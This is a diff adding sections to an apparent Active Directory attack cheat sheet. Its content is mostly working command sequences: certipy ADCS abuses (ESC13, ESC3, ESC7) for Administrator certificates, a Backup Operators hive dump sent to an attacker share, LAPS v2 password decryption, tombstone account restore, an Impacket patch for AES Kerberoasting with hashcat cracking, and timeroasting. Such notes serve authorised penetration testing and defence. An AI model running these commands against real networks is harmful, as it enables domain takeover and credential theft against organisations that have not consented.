@@ -93,3 +93,66 @@ export KRB5CCNAME=<target>.ccache
 getnthash.py -key <session-key-from-pkinit-output> <domain>/<TARGET>   # recover their NT hash via U2U
 ```
 
+ESC13 (issuance policy OID linked to a privileged group) — certipy flags it directly; just request the template:
+```bash
+certipy find -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -vulnerable
+certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <template> -key-size 4096   # bump key size if the default is rejected
+certipy auth -pfx <issued>.pfx -dc-ip <DC_IP>
+```
+
+ESC3 (template has the Certificate Request Agent EKU) — lets you enroll an agent cert, then use it to request a cert *on behalf of* anyone else:
+```bash
+certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <enrollment-agent-template>
+certipy req -u <USER>@<domain> -p '<PASS>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template User \
+  -on-behalf-of '<DOMAIN>\Administrator' -pfx <agent-cert>.pfx
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+ESC7 (you hold Manage CA / Manage Certificates rights on the CA itself) — approve your own pending request after enabling a privileged template:
+```bash
+certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -add-officer <USER>
+certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -enable-template SubCA
+certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -target <DC_FQDN> -template SubCA \
+  -upn 'administrator@<domain>' -sid '<domain-SID>-500'                 # returns a pending request ID
+certipy ca -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -issue-request '<request-ID>'
+certipy req -u <USER>@<domain> -p '<PASS>' -ca <CA_NAME> -target <DC_FQDN> -retrieve '<request-ID>'
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+Backup Operators group membership — this group can remotely dump SAM/SYSTEM registry hives without ever getting an interactive session:
+```bash
+nxc smb <target> -u <USER> -H '<hash>' -M backup_operator    # drives the remote backup+download for you
+# or manually:
+reg.py '<domain>/<USER>'@<target> -hashes ':<hash>' backup -o '\\<attacker-share>'
+secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
+```
+
+LAPS v2 (DPAPI-NG encrypted blobs) — the plaintext local-admin password is now wrapped in DPAPI-NG, not AES; strip the 16-byte header, then let the DC unwrap it over Kerberos (requires read rights on `msLAPS-EncryptedPassword`, granted to whatever principal the LAPS policy names):
+```bash
+bloodyAD -d <domain> -u <USER> -k --host <DC_FQDN> msldap laps      # dumps raw blobs (current + password history)
+```
+```python
+import dpapi_ng
+data = raw_blob[16:]   # strip the KDSK header
+dpapi_ng.ncrypt_unprotect_secret(data, server="<DC_FQDN>", auth_protocol="kerberos").decode("utf-16-le")
+```
+
+Deleted-object (tombstone) restore via a `restore` right — if an ACL abuse chain gives you write access to a deleted account's tombstone, restoring it resurrects the account with its original group memberships/ACLs intact, which can reopen an otherwise-closed privilege path:
+```bash
+bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' set restore '<deleted-sAMAccountName>' --newParent '<target-OU-DN>'
+```
+
+Targeted Kerberoast against an AES-only account (`msDS-SupportedEncryptionTypes` excludes RC4) — Impacket's `GetUserSPNs.py` requests RC4 by default and gets rejected; patch it to request AES instead:
+```bash
+sed -i 's/int(constants.EncryptionTypes.rc4_hmac.value)/int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)/g' \
+  $(python3 -c "import impacket,os;print(os.path.dirname(impacket.__file__))")/krb5/kerberosv5.py
+GetUserSPNs.py -dc-host <DC_FQDN> -request -k -no-pass '<domain>/<USER>$'   # -> $krb5tgs$18$... (etype 18 = AES256)
+hashcat -m19700 -a0 hash.txt <WORDLIST>
+```
+
+Timeroasting — computer accounts can be hashed via unauthenticated SNTP (MS-SNTP), no creds needed at all; useful recon/cred-crack path on a DC with lots of machine accounts:
+```bash
+nxc smb <DC_IP> -M timeroast                 # dumps RID:hash pairs
+hashcat --username -a0 -m31300 hashes.txt <WORDLIST>   # mode needs a recent hashcat (7.x); older builds lack it
+```
+
